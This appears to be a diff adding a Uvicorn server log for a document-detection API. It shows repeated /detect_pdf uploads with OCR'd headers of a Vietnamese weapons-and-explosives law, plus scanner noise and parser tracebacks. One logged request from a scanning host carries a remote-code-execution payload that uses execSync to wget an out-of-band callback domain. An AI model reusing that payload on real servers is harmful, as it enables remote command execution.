@@ -1,0 +1,2504 @@
+INFO:     Started server process [77056]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:3000 (Press CTRL+C to quit)
+INFO:     123.24.206.26:59100 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:59100 - "GET /openapi.json HTTP/1.1" 200 OK
+ảnh hợp đồng.PNG
+INFO:     123.24.206.26:44017 - "POST /detect_pdf HTTP/1.1" 200 OK
+ảnh hợp đồng.PNG
+INFO:     123.24.206.26:36433 - "POST /detect_pdf HTTP/1.1" 200 OK
+ảnh hợp đồng.PNG
+INFO:     123.24.206.26:57166 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:35969 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:61250 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:49098 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:51971 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:48585 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:43658 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:48106 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:48731 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:47563 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:49441 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:63340 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:51201 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:55518 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:56953 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:37581 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:33083 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:35609 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:59904 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:55636 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:62229 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:55413 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:36476 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:56731 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:33428 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:52209 - "POST /detect_pdf HTTP/1.1" 200 OK
+Capture.PNG
+INFO:     123.24.206.26:47075 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:54134 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     87.236.176.4:48367 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     192.99.62.110:35612 - "GET /page?id=2HzidGf7AvrJBYSGpViLrEifEsw&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27wget+http://cdvmifl71kdrt3000010xmtrnkh89cj6m.oast.online%27);s HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:63165 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:54954 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:56862 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:61831 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:48860 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:34843 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:40495 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:42153 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:39754 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:36696 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:52077 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:63103 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:33190 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:49094 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:59604 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:57737 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:51288 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:46599 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:34924 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:38123 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:52958 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     165.22.216.223:33170 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.163:63246 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:40645 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:40645 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     198.235.24.167:60450 - "GET / HTTP/1.1" 404 Not Found
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:48550 - "POST /detect_pdf HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 193, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'google.com:443'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:52785 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:43570 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:35537 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:58114 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:64756 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:55587 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     198.235.24.129:61826 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:39814 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:52863 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:34244 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:32873 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
